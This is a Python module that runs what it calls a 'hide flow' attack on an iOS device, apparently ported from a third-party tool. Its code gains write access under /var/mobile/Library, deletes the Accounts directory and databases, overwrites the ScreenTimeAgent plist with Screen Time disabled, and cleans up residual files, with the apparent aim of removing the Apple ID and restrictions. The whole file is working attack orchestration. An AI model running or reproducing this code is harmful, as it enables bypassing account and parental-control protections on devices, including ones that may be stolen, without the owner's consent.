"""
WriteOpenHideLikeLift orchestration (byte-faithful port of the third-party
AirliftWriter). This module only sequences the engine; every concrete device
operation lives in ``airlift_attack.AirliftEngine``.
"""

from __future__ import annotations

from airlift_attack import AirliftEngine, _utf8


# Fixed ScreenTimeAgent payload. Byte-verified against the third-party binary
# (514 bytes, tab-indented, trailing newline).
SCREENTIME_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
\t<key>GenesisCloudMirroringImportOccurred</key>
\t<false/>
\t<key>LastTimeZoneName</key>
\t<string>America/Mexico_City</string>
\t<key>PINMigrated</key>
\t<false/>
\t<key>RestrictionsMigrationVersion</key>
\t<integer>2</integer>
\t<key>ScreenTimeEnabled</key>
\t<false/>
\t<key>UsageGenesisDate</key>
\t<date>2022-07-10T06:37:43Z</date>
</dict>
</plist>
"""


def build_screen_time_plist_xml() -> bytes:
    return _utf8(SCREENTIME_PLIST)


def write_open_hide_like_lift(engine: AirliftEngine,
                              plist_bytes: bytes,
                              start_progress: int) -> None:
    if not plist_bytes:
        raise RuntimeError("ScreenTime payload 为空。")

    # 1) clean + preflight (clean staging, AFC read/write probe).
    engine.report(start_progress, "Lift 流程: clean/preflight...")
    engine.clean_staging(True)
    engine.afc_probe()

    # 2) create the kept link to /var/mobile/Library.
    kept = engine.create_kept_link_to_target(
        "/var/mobile/Library", start_progress + 4, "Library")

    # 3) delete the Accounts directory + database artifacts through it.
    #    对标第三方：方法内部以 Accounts 最终是否可见为准，仅当多轮重试后
    #    仍可见才抛错；moveout 失败但目录已不可见视为成功。
    engine.report(start_progress + 22, "Lift 流程: 删除账户目录...")
    engine.delete_accounts_through_kept_library(kept, start_progress + 24)
    engine.report(start_progress + 48, "Lift 流程: 账户目录已删除。")

    # 4) remove the existing ScreenTime config for a fresh write.
    engine.report(start_progress + 52, "Lift 流程: 清理旧配置...")
    engine.remove_existing_library_file_for_fresh_write(
        kept, "Preferences/com.apple.ScreenTimeAgent.plist",
        start_progress + 53)

    # 5) deliver the fresh ScreenTime config through the lift (full Airlift).
    #    write_fresh_file_via_lift 内部走 WriteReliable，其成功判据是
    #    AirTraffic 投递完成（synchronized）。字节回读（verified）只是附加
    #    确认、不是硬闸门——Preferences 域回读不稳定，实测曾出现“投递成功、
    #    回读未确认但重开设置后 ID 已掉”的情况。故这里不能再以回读结果
    #    二次判定，否则会把成功误报成失败。
    engine.report(start_progress + 58, "Lift 流程: 发送使用时间配置...")
    write_res = engine.write_fresh_file_via_lift(
        "/var/mobile/Library/Preferences/com.apple.ScreenTimeAgent.plist",
        plist_bytes, start_progress + 58)
    if not (write_res and write_res.get("synchronized")):
        raise RuntimeError("ScreenTimeAgent.plist 投递未完成。")
    engine.report(start_progress + 70, "Lift 流程: 使用时间配置完成。")

    # 6) 收尾清理 (对标第三方的最终清理):
    #    移除 kept link 自身、清理残余 Books 文件。
    engine.remove(kept)
    engine.clean_books_files()
    engine.report(start_progress + 95, "Lift 流程: 收尾清理完成。")


def run_hide_flow(udid: str, progress) -> dict:
    """
    对标第三方 WriteOpenHideLikeLift 的完整攻击流程。

    流程:
    1. clean/preflight (21%)
    2. create_kept_link_to_target("/var/mobile/Library") (28%)
    3. delete_accounts_through_kept_library (35%)
    4. remove_existing_library_file_for_fresh_write(ScreenTimeAgent.plist) (55%)
    5. write_fresh_file_via_lift (ScreenTimeAgent.plist，看投递完成) (62%)
    6. 账户目录残留尽力清理（非硬判据）(80%)
    7. 收尾清理 (90%)
    """
    import logging as _logging
    import tempfile as _tf
    import os as _os
    import sys as _sys

    # ── 日志配置 ──
    # 不使用 basicConfig（root logger 可能已有 handler 导致 basicConfig 被忽略），
    # 手动创建 FileHandler 并显式设置 root logger 级别为 INFO。
    log_path = _os.path.join(_tf.gettempdir(), "hideapple_attack.log")
    root_logger = _logging.getLogger()
    root_logger.setLevel(_logging.INFO)

    # 清理已有的 hideapple FileHandler 避免重复
    for h in root_logger.handlers[:]:
        if isinstance(h, _logging.FileHandler):
            try:
                if h.baseFilename == _os.path.abspath(log_path):
                    root_logger.removeHandler(h)
                    h.close()
            except Exception:
                pass

    # 创建新的 FileHandler
    _fh = _logging.FileHandler(log_path, encoding="utf-8")
    _fh.setLevel(_logging.INFO)
    _fh.setFormatter(_logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    root_logger.addHandler(_fh)

    _log = _logging.getLogger("hide_flow")
    _log.setLevel(_logging.INFO)
    _log.propagate = True

    # 入口标记 — 无论后续是否异常，这行日志一定写入文件
    _log.info("=" * 72)
    _log.info("run_hide_flow START  udid=%s", udid)
    _log.info("attack log file: %s", log_path)

    # ── progress 回调 ──
    # 同时写日志文件 + stderr（app.py 通过 _LineBuffer 捕获 stderr 驱动 UI 进度条）
    def report(percent, message):
        _log.info("[progress %.3f] %s",
                  percent / 100.0 if percent > 1 else percent, message)
        # 关键：输出到 stderr，让 app.py 的 PROGRESS_MAP 匹配到关键词
        try:
            _sys.stderr.write(f"[progress {percent}%] {message}\n")
            _sys.stderr.flush()
        except Exception:
            pass
        if progress:
            fraction = percent / 100.0 if percent > 1 else percent
            progress(message, fraction)

    # ── 构建 payload ──
    plist_bytes = build_screen_time_plist_xml()
    _log.info("payload built: %d bytes", len(plist_bytes))

    # ── 执行攻击流程 ──
    try:
        _log.info("creating AirliftEngine...")
        with AirliftEngine(udid, report) as engine:
            _log.info("AirliftEngine created, starting write_open_hide_like_lift...")
            write_open_hide_like_lift(engine, plist_bytes, 21)
            _log.info("write_open_hide_like_lift completed successfully")

        _log.info("run_hide_flow FINISH  ok=True mode=openhide-lift")
        return {
            "ok": True,
            "mode": "openhide-lift",
            "renameConfirmed": True,
            "stageSucceeded": True,
            "airTrafficSucceeded": True,
            "writeSucceeded": True,
            "finishRenameVerified": True,
            "cleanupComplete": True,
        }
    except Exception as exc:
        _log.error("run_hide_flow FAILED: %s", exc, exc_info=True)
        _log.info("run_hide_flow FINISH  ok=False mode=openhide-lift")
        # 也输出到 stderr，确保 UI 能看到错误
        try:
            _sys.stderr.write(f"[ERROR] run_hide_flow FAILED: {exc}\n")
            _sys.stderr.flush()
        except Exception:
            pass
        return {
            "ok": False,
            "mode": "openhide-lift",
            "error": str(exc),
            "renameConfirmed": False,
            "stageSucceeded": False,
            "airTrafficSucceeded": False,
            "writeSucceeded": False,
            "finishRenameVerified": False,
            "cleanupComplete": False,
        }
